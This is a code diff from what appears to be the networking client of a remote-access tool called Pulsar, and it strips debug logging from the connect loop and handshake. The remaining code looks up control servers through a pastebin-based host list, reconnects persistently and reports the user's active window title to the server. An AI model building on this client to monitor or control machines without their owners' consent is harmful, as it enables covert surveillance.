@@ -83,22 +83,20 @@ namespace Pulsar.Client.Networking
         /// </summary>
         public void ConnectLoop()
         {
-            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_connect.log");
-            
-            try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ConnectLoop STARTED\r\n"); } catch { }
+
+
             
             while (!_shutdownRequested && !_token.IsCancellationRequested)
             {
                 if (!Connected)
                 {
                     var host = _hosts.GetNextHost();
-                    
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] GetNextHost returned: {(host == null ? "NULL" : $"{host.Hostname}:{host.Port}, IpAddress={host.IpAddress}")}\r\n"); } catch { }
+
 
                     if (host?.IpAddress == null)
                     {
                         Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
-                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] No valid host, sleeping...\r\n"); } catch { }
+
                         
                         // Check pastebin status to determine appropriate wait time
                         var (IsReachable, SuggestedWaitTimeMs) = _hosts.GetPastebinStatus();
@@ -122,18 +120,18 @@ namespace Pulsar.Client.Networking
 
                     try
                     {
-                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Attempting connect to {host.IpAddress}:{host.Port}\r\n"); } catch { }
-                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Before base.Connect() - Connected={Connected}\r\n"); } catch { }
+
+
                         base.Connect(host.IpAddress, host.Port);
-                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] After base.Connect() - Connected={Connected}\r\n"); } catch { }
+
                     }
                     catch (Exception ex)
                     {
                         Debug.WriteLine($"Connection attempt failed: {ex.GetType().Name}: {ex.Message}");
-                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] EXCEPTION {ex.GetType().Name}: {ex.Message}\r\n"); } catch { }
+
                         if (ex.InnerException != null)
                         {
-                            try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}]   Inner: {ex.InnerException.Message}\r\n"); } catch { }
+
                         }
                     }
                 }
@@ -163,23 +161,22 @@ namespace Pulsar.Client.Networking
 
         private void OnClientRead(Client client, IMessage message, int messageLength)
         {
-            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_connect.log");
-            try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] OnClientRead: {message.GetType().Name}, Identified={_identified}\r\n"); } catch { }
+
+
             
             if (!_identified)
             {
                 if (message is ClientIdentificationResult reply)
                 {
                     _identified = reply.Result;
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ClientIdentificationResult received: Result={reply.Result}, now Identified={_identified}\r\n"); } catch { }
+
                     if (_identified)
                     {
-                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Identification successful, sending SetUserActiveWindowStatus\r\n"); } catch { }
+
                         // Now that identification is complete, send the active window status
                         string currentWindowTitle = GetCurrentWindowTitle();
                         Send(new SetUserActiveWindowStatus { WindowTitle = currentWindowTitle });
-                        
-                        try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Identification successful, requesting deferred assemblies\r\n"); } catch { }
+
                         RequestDeferredAssemblies();
                     }
                 }
@@ -197,15 +194,15 @@ namespace Pulsar.Client.Networking
 
         private void OnClientState(Client client, bool connected)
         {
-            string logFile = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_client_connect.log");
-            try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] OnClientState: connected={connected}\r\n"); } catch { }
+
+
             
             _identified = false; // always reset identification
             _requestedDeferredAssemblies = false;
 
             if (connected)
             {
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Building ClientIdentification packet...\r\n"); } catch { }
+
                 
                 // Notify hosts manager of successful connection for pastebin timing logic
                 _hosts.NotifySuccessfulConnection();
@@ -234,21 +231,21 @@ namespace Pulsar.Client.Networking
 
                 try
                 {
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ClientID: {identification.Id} (len={identification.Id?.Length})\r\n"); } catch { }
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] EncryptionKey: '{identification.EncryptionKey}'\r\n"); } catch { }
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Signature: {identification.Signature?.Length ?? 0} bytes\r\n"); } catch { }
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Sending ClientIdentification (Version={identification.Version}, Tag={identification.Tag})...\r\n"); } catch { }
+
+
+
+
                     client.Send(identification);
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] ClientIdentification sent successfully\r\n"); } catch { }
+
                 }
                 catch (Exception ex)
                 {
-                    try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] FAILED to send identification: {ex.Message}\r\n"); } catch { }
+
                 }
             }
             else
             {
-                try { System.IO.File.AppendAllText(logFile, $"[{System.DateTime.Now:HH:mm:ss.fff}] Client disconnected\r\n"); } catch { }
+
             }
         }
 
